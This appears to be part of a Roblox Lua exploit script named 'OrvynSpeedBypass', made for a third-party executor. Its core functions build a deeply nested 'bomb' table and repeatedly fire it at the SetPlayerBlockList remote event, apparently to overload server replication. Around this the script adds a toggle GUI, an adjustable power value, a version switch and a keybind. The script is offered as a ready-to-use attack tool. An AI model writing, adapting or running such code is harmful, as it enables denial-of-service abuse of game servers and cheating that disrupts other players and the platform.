-- ===== CONFIG =====
local CONFIG_FILE = "OrvynSpeedBypass_Config.json"

local cfg = {
	power = 100000,
	keybind = "B",
	version = 2
}

local function saveConfig()
	if writefile then
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(cfg))
		end)
	end
end

local function loadConfig()
	if isfile and readfile and isfile(CONFIG_FILE) then
		local ok, data = pcall(function()
			return HttpService:JSONDecode(readfile(CONFIG_FILE))
		end)
		if ok and type(data) == "table" then
			cfg.power = tonumber(data.power) or 100000
			cfg.keybind = type(data.keybind) == "string" and data.keybind or "B"
			cfg.version = tonumber(data.version) or 2
		end
	end
end

local function isGamepad(kc)
	local n = kc.Name
	return n:sub(1,6) == "Button" or n:sub(1,10) == "Thumbstick" or n:sub(1,4) == "DPad" or n == "ButtonSelect" or n == "ButtonStart"
end

local function buildBomb(power, depth)
	local maintable = {}
	local spammedtable = {{}}
	local z = spammedtable[1]
	for i = 1, depth do
		local t = {}
		table.insert(z, t)
		z = t
	end
	for i = 1, math.floor(power / (depth + 2)) do
		table.insert(maintable, spammedtable)
	end
	return maintable
end

local function stopBypass()
	running = false
	if spamThread then pcall(function() task.cancel(spamThread) end) end
	spamThread = nil
end

local function startBypass(power)
	stopBypass()
	running = true
	local depth = (currentVersion == 1) and V1_DEPTH or V2_DEPTH
	local delay = (currentVersion == 1) and V1_DELAY or V2_DELAY
	local bomb = buildBomb(power, depth)
	spamThread = task.spawn(function()
		while running do
			pcall(function()
				game.RobloxReplicatedStorage.SetPlayerBlockList:FireServer(bomb)
			end)
			task.wait(delay)
		end
	end)
end

-- ===== LOGIC =====
local function updateVisual()
	if active then
		statusLbl.Text = "ONLINE"
		statusLbl.TextColor3 = Color3.fromRGB(80, 255, 140)
		TweenService:Create(toggleCircle, TweenInfo.new(0.15), {Position = UDim2.new(1, -18, 0.5, -8)}):Play()
		TweenService:Create(toggleBg, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(50, 180, 90)}):Play()
	else
		statusLbl.Text = "OFFLINE"
		statusLbl.TextColor3 = Color3.fromRGB(160, 160, 180)
		TweenService:Create(toggleCircle, TweenInfo.new(0.15), {Position = UDim2.new(0, 2, 0.5, -8)}):Play()
		TweenService:Create(toggleBg, TweenInfo.new(0.15), {BackgroundColor3 = Color3.fromRGB(45, 45, 58)}):Play()
	end
end

local function setActive(state)
	active = state
	if state then startBypass(powerValue) else stopBypass() end
	updateVisual()
end

local function setVersion(v)
	currentVersion = v
	cfg.version = v
	versionLbl.Text = "v" .. v
	saveConfig()
	if active then startBypass(powerValue) end
end

toggleBtn.MouseButton1Click:Connect(function() setActive(not active) end)
prevBtn.MouseButton1Click:Connect(function() setVersion(currentVersion == 2 and 1 or 2) end)
nextBtn.MouseButton1Click:Connect(function() setVersion(currentVersion == 2 and 1 or 2) end)

powerBox.FocusLost:Connect(function()
	local n = tonumber(powerBox.Text)
	if n then
		powerValue = math.clamp(math.floor(n), 1, 999999)
		powerBox.Text = tostring(powerValue)
		cfg.power = powerValue
		saveConfig()
		if active then startBypass(powerValue) end
	else
		powerBox.Text = tostring(powerValue)
	end
end)

keyBtn.MouseButton1Click:Connect(function()
	if waitingForKey then return end
	waitingForKey = true
	keyBtn.Text = "..."
end)

clearBtn.MouseButton1Click:Connect(function()
	boundKey = nil
	cfg.keybind = "None"
	keyBtn.Text = "None"
	waitingForKey = false
	saveConfig()
end)

UserInputService.InputBegan:Connect(function(inp, gpe)
	local kc = inp.KeyCode
	if kc == Enum.KeyCode.Unknown then return end

	if waitingForKey then
		if kc == Enum.KeyCode.Escape then
			waitingForKey = false
			keyBtn.Text = cfg.keybind == "None" and "None" or (boundKey and boundKey.Name or "None")
			return
		end
		-- Accepte clavier + manette
		boundKey = kc
		cfg.keybind = kc.Name
		keyBtn.Text = kc.Name
		waitingForKey = false
		saveConfig()
		return
	end

	if gpe then return end

	-- Activation via keybind (clavier ou manette)
	if boundKey and kc == boundKey then
		setActive(not active)
	end
end)

-- Drag
local dragging, dragStart, startPos
main.InputBegan:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
		dragging = true
		dragStart = inp.Position
		startPos = main.Position
	end
end)
UserInputService.InputEnded:Connect(function(inp)
	if inp.UserInputType == Enum.UserInputType.MouseButton1 or inp.UserInputType == Enum.UserInputType.Touch then
		dragging = false
	end
end)
UserInputService.InputChanged:Connect(function(inp)
	if dragging and (inp.UserInputType == Enum.UserInputType.MouseMovement or inp.UserInputType == Enum.UserInputType.Touch) then
		local d = inp.Position - dragStart
		main.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
	end
end)
